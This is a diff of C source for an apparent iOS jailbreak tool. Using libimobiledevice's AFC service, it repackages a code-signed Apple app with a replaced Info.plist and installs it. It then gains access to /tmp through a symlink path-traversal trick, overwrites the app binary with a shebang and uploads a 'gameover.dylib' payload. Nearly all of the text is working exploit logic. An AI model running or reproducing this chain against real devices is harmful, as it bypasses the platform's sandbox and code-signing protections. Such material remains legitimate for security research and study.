@@ -283,8 +283,8 @@ afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
 void minst_cb(const char *operation, plist_t status, void *unused) {
 	cb++;
 	if (cb == 8) {
-		printf(" [*] Callback %d - ", cb);
-		printf("Inject NOW!!!\n");
+		printf(" [*] Injection vector found - ", cb);
+		printf("Injecting exploit...\n");
 	}
 	if (status && operation) {
 		plist_t npercent = plist_dict_get_item(status, "PercentComplete");
@@ -308,6 +308,7 @@ void minst_cb(const char *operation, plist_t status, void *unused) {
 		if (nerror) {
 			char *err_msg = NULL;
 			plist_get_string_val(nerror, &err_msg);
+			printf("Error: %s", err_msg);
 			printf("%s [*] Unable to install app. Please reboot your device and try again.%s\n\n", KRED, KNRM);
 			free(err_msg);
 			installing = 0;
@@ -378,7 +379,21 @@ int main(int argc, char *argv[]) {
 	gLockdown = NULL;
 	
 	printf("%s [*] Successfully created new AFC client!%s\n\n", KGRN, KNRM);
+		
+	printf(" [*] Performing sanity checks...\n");
+		
+	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", NULL);
+	if (afcerr != AFC_E_SUCCESS) {
+		afc_remove_path(gAfc, "/Downloads/WWDC.app");
+	}
 	
+	afcerr = afc_read_directory(gAfc, "/Breakout-Install", NULL);
+	if (afcerr != AFC_E_SUCCESS) {
+		afc_remove_path(gAfc, "/Breakout-Install");
+	}
+	
+	printf("%s [*] Sanity checks complete!!%s\n\n", KGRN, KNRM);
+		
 	printf(" [*] Attempting to create Breakout-Install directory and push required files...\n");
 	
 	// create a directory in /var/mobile/Media to store our stuff.
@@ -390,6 +405,7 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
+	// upload our custom icon, which is set in the new Info.plist to be uploaded.
 	afcerr = afc_send_file(gAfc, "resources/jbicon.png", "Breakout-Install/jbicon.png");
 	if (afcerr != AFC_E_SUCCESS) {
 		printf("%s [*] Unable to push required files. Please reboot your device and try again.%s\n\n", KRED, KNRM);
@@ -401,22 +417,24 @@ int main(int argc, char *argv[]) {
 	printf(" [*] Downloading code-signed app from Apple...\n");
 	// I don't have net ATM system("curl -b \"downloadKey=expires=1387947603~access=/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa*~md5=dc91b9d5599eb2e135bddbec3ad5dbc2\" http://a396.phobos.apple.com/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa -o resources/wwdc.ipa > /dev/null");
 	printf("%s [*] Successfully downloaded app!%s\n\n", KGRN, KNRM);
+	
+	// I know this is ugly and definitely not elegant, but it's easy.
 	system("unzip resources/wwdc.ipa > /dev/null");
-	system("cp -r Payload/WWDC.app resources/WWDC.app");
+	system("cp -r Payload/WWDC.app resources/");
 	system("cp resources/Info.plist Payload/WWDC.app/Info.plist > /dev/null");
 	system("zip -r resources/breakout.ipa Payload/ META-INF/ > /dev/null");
 	system("rm -r Payload META-INF > /dev/null");
 		
 	printf(" [*] Attempting to upload original app to /Downloads...\n");
-	char* cwd = realpath(".", NULL);
-	if (cwd != NULL ) {
-		char* app = (char*) malloc(strlen(cwd) + sizeof("resources/WWDC.app") + 2);
-		strcpy(app, cwd);
-		strcat(app, "/resources/");
-		strcat(app, "WWDC.app");
-		afc_send_directory(gAfc, app, "Downloads/");
+
+	afcerr = afc_send_directory(gAfc, "resources/WWDC.app", "Downloads/WWDC.app");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Unable to upload original app to /Downloads. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
 	}
 	
+	system("rm -rf resources/WWDC.app > /dev/null");
+		
 	printf("%s [*] Successfully uploaded app!%s\n\n", KGRN, KNRM);
 	
 	printf(" [*] Attempting to upload custom IPA to /Breakout-Install...\n");
@@ -426,6 +444,8 @@ int main(int argc, char *argv[]) {
 		printf("%s [*] Unable to upload custom IPA. Please reboot your device and try again.%s\n\n", KRED, KNRM);
 		return -1;
 	}
+	
+	system("rm -rf resources/breakout.ipa > /dev/null");
 	
 	printf("%s [*] Successfully uploaded custom IPA!%s\n\n", KGRN, KNRM);
 	
@@ -480,11 +500,26 @@ int main(int argc, char *argv[]) {
 	}
 	
 	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
-	
+		
 	printf(" [*] Attempting to get access to /tmp through symlink hacks...\n");
 	
-	afc_make_link(gAfc, 2, "../../../../../tmp", "Downloads/a/a/a/a/a/link");
-	afc_rename_path(gAfc, "Downloads/a/a/a/a/a/link", "tmp");
+	afcerr = afc_make_directory(gAfc, "Downloads/a/a/a/a/a");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
+	}
+	
+	afcerr = afc_make_link(gAfc, 2, "../../../../../tmp", "Downloads/a/a/a/a/a/link");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
+	}
+	
+	afcerr = afc_rename_path(gAfc, "Downloads/a/a/a/a/a/link", "tmp");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
+	}
 	
 	char **list = NULL;
 	afcerr = afc_read_directory(gAfc, "tmp/", &list);
@@ -493,8 +528,8 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
-	printf("%s [*] Successfully got access to /tmp!%s\n\n", KGRN, KNRM);
-		
+	printf("%s [*] Successfully got access to /tmp!%s\n\n", KGRN, KNRM);	
+	
 	printf(" [*] Attempting to replace original binary with shebang...\n");
 	
 	uint32_t bw = 0;
@@ -508,6 +543,15 @@ int main(int argc, char *argv[]) {
 		printf("%s [*] Could not write overwrite binary. Please reboot your device and try again.%s\n\n", KRED, KNRM);
 		return -1;
 	}
+	
+	printf(" [*] Attempting to upload gameover.dylib...\n");
+	afcerr = afc_send_file(gAfc, "resources/gameover.dylib", "Downloads/WWDC.app/");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Could not upload gameover.dylib. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
+	}
+	
+	printf("%s [*] Successfully uploaded gameover.dylib!%s\n\n", KGRN, KNRM);
 	
 	// obviously there's a lot more to implement.
 		
